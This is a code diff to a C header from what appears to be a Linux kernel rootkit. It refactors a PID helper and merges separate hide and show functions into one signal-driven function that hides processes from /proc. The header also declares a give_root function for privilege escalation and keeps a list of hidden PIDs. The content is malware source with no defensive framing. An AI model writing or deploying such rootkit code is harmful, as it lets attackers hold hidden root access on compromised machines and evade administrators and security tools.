@@ -79,19 +79,19 @@ extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
  */
 static inline pid_t get_effective_pid(const pid_t i32_pid)
 {
-    pid_t i32_real_pid = i32_pid;
-
-    if (i32_real_pid == 0) {
-        i32_real_pid = current->pid;
+    if (i32_pid == 0) {
+        return current->pid;
     }
-    else if (i32_real_pid == INT_MIN) {
+
+    if (i32_pid == INT_MIN) {
         return -1;
     }
-    else if (i32_real_pid < -1) {
-        i32_real_pid = -i32_real_pid;
+
+    if (i32_pid < -1) {
+        return -i32_pid;
     }
 
-    return i32_real_pid;
+    return i32_pid;
 }
 
 /**
@@ -123,24 +123,13 @@ bool is_pid_hidden(const pid_t i32_pid);
 long give_root(const pid_t i32_pid, const int i32_sig);
 
 /**
- * Hides the given process from /proc/ and /proc/PID/.
- * If the given PID is 0, the current process is hidden.
+ * Hides or shows (unhides) the given process from /proc/ and /proc/PID/.
+ * If the given PID is 0, the current process is (un)hidden.
  *
- * @param i32_pid The PID to hide
- * @param i32_sig The signal that was passed (currently unused)
+ * @param i32_pid The PID to (un)hide
+ * @param i32_sig The signal that was passed (SIGHIDE or SIGSHOW)
  * @return 0 on success, otherwise an error code
  */
-long hide_process(const pid_t i32_pid, const int i32_sig);
-
-/**
- * Shows (unhides) the given process from /proc/ and /proc/PID/.
- * If the given PID is 0, the current process is shown.
- * If the given PID is not hidden, do nothing.
- *
- * @param i32_pid The PID to show
- * @param i32_sig The signal that was passed (currently unused)
- * @return 0 on success, otherwise an error code
- */
-long show_process(const pid_t i32_pid, const int i32_sig);
+long show_hide_process(const pid_t i32_pid, const int i32_sig);
 
 #endif
